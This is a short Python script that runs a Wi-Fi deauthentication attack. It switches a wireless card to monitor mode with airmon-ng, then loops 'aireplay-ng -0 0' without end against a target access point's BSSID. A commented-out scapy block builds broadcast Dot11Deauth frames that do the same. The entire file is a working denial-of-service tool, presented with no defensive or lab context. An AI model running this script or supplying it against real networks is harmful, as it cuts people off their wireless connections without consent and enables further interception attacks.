#!/usr/bin/python

from scapy.all import *
import subprocess
import utile
import os
import time


BSSID = utile.getAPMac()

subprocess.call('clear', shell=True)
subprocess.call('airmon-ng ckeck kill',shell=True)

print('Card available ....')
subprocess.call('airmon-ng',shell=True)

networkCard = "wlan0"

subprocess.call('airmon-ng start {} 1'.format(networkCard), shell=True)
subprocess.call('airmon-ng check kill', shell=True)

networkCardMon = '{}mon'.format(networkCard)

# try:
#     subprocess.call('clear',shell=True)
#     print('Scan ...')
#     subprocess.call('airodump-ng {}'.format(networkCard),shell=True)
#     time.sleep(7)
# except KeyboardInterrupt:
#     print(''*3)
#
# brdMac = 'ff:ff:ff:ff:ff:ff'
#subprocess.call("aireplay-ng -0 0 -a {} {}".format(BSSID,networkCard),shell=True)
#packet = RadioTap() / Dot11(addr1= brdMac, addr2=BSSID,addr3= BSSID)/Dot11Deauth()
#sendp(packet,iface = networkCard, count= 1000,inter= 0.2)

while True:
    try:
        os.system("aireplay-ng -0 0 -a {} {}".format(BSSID,networkCardMon))
    except KeyboardInterrupt:
        break

#Arreter le mode monitor et redemarrer la carte wifi
print('Cleaning ...')
subprocess.call("airmon-ng stop {}".format(networkCardMon),shell=True)
subprocess.call("ifconfig {} up".format(networkCard),shell=True)
subprocess.call("service NetworkManager start",shell=True)
subprocess.call('clear',shell=True)
